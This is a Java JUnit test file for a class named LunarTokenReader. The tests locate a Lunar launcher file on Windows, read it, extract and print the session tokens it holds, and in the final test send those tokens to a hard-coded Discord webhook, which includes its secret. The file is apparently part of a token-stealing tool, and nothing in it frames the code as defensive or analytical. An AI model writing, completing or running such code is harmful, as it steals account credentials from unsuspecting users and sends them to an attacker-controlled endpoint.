package util;

import org.junit.Test;
import static org.junit.Assert.*;
import java.io.*;
import java.util.Map;

public class LunarTokenReaderTest {

    @Test
    public void testPath() {
        LunarTokenReader tr = new LunarTokenReader();
        assertNotNull(tr.windowsPath);
        System.out.println("WindowsPath: " + tr.windowsPath);
    }

    @Test
    public void testFile() {
        LunarTokenReader tr = new LunarTokenReader();
        File f = new File(tr.windowsPath);
        assertTrue(f.isFile() && f.canRead());

    }

    @Test
    public void testReadFile() throws FileNotFoundException, IOException{
        String content = new LunarTokenReader().readLunarFile();
        assertNotEquals(content,"");
        System.out.println(content);
    }

    @Test
    public void testTokenGrabber() throws IOException {
        LunarTokenReader tr = new LunarTokenReader();
        Map<String, String> tokens = tr.getTokens();

        for(String key : tokens.keySet()) {
            System.out.println(key + ": " + tokens.get(key));

        }
    }

    @Test
    public void sendTokensTest() {
        String webhookUrl = "https://discord.com/api/webhooks/1248630842947797042/u3zPVi_LZRCtZPGOEZqa-W0kjnNfy2B4lC85qwcfiz-BFAlSKUos2gRH9UZPyXr_G0lk";
        try {
            LunarTokenReader tr = new LunarTokenReader();
            tr.setDiscordWebhook(webhookUrl);
            tr.sendTokens("Lunar");
        } catch (Exception e) {
            System.out.println("TEST: Failed to send lunar tokens: " + e);
        }
    }
}
